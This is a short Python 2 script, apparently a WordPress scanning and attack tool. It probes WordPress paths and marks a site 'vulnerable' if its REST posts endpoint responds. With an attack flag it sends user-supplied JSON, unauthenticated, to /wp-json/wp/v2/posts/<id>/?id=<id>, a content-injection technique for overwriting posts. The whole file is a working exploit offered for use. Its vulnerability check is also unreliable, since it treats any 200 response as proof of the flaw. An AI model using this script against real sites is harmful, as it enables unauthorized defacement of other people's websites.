import requests
import urllib
import argparse
from threading import Thread
import json
import sys

args = argparse.ArgumentParser()
args.add_argument('-u', '--url', type=str)
args.add_argument('-da', '--doAttack', type=str, help='y or n')
parser = args.parse_args()

class Wpscan():
	def __init__(self, url):

		self.headers = {'User-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1'}
		self.u = url
		self.uris = ['/wp-content', '/wp-json', '/wp-login','/wp-content/uploads/', '/wp-includes','/wp-content/uploads/themes','/wp-content/plugins/wp-responsive-thumbnail-slider/readme.txt','/wp-content/plugins/wp-responsive-thumbnail-slider/' ,'/wp-content/themes', '/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php', '/wp-json/wp/v2/posts']

		self.vuln = ['/wp-json/wp/v2/posts']


	def wpScan(self):
		try:
			req = requests.request('GET', self.u+self.uris[1], headers=self.headers)
			if req.status_code == 200:
				print '[+WordPress Founded+] {0}'.format(self.u)
			else:
				print '[N] {0} doesnt uses Wordpress'.format(self.u)
				sys.exit()
		except Exception as e:
			return e

	def vulnCheck(self):
		try:
			req = requests.request('GET', self.u+self.vuln[0], headers=self.headers)
			if req.status_code == 200:
				print '\n[+Vulnearable+] {0} '.format(self.u+self.vuln[0])
			else:
				print '\n[N] {0} not vulnerable'.format(self.u+self.vuln[0])
		except Exception as e:
			return e
	
	def dirAvail(self):
		for uri in self.uris:
			try:
				req = requests.request('GET', self.u+uri, headers=self.headers)
				if req.status_code == 200:
					print '\n[+EXISTS+] {0} '.format(self.u+uri)
				else:
					print '\n[+CODE {}+]{}'.format(req.status_code, self.u+uri)
			except Exception as e:
				return e

	def getData(self):
		try:
			req = requests.request('GET', self.u+self.uris[1])
			jsonData = req.text
			parse = json.dumps(str(jsonData))
		except Exception as e:
			return e

	def sendData(self):
		try:	
			posId = raw_input('Post id: ')
			data_to_send = raw_input('Enter data in json format..\n')
			do_post = self.u+self.vuln[0]+'/'+posId+'/?id='+posId
			print '\nSending..==> {0}'.format(do_post)
			req = requests.request('POST', do_post , data=data_to_send)
			print '\n'+str(req.text)
			return '\nStatus Code {0}'.format(req.status_code)
		except Exception as e:
			print '{0} Error occured...'.format(req.status_code)
			return e


	def start(self):
		self.wpScan()
		self.vulnCheck()
		self.dirAvail()

if __name__ == '__main__':
	wpscan = Wpscan(parser.url)
	if parser.doAttack == 'y':
		wpscan.sendData()
	else:
		print '\n==================== RESULT ================================'
		wpscan.start()
		print '====================== END =================================='



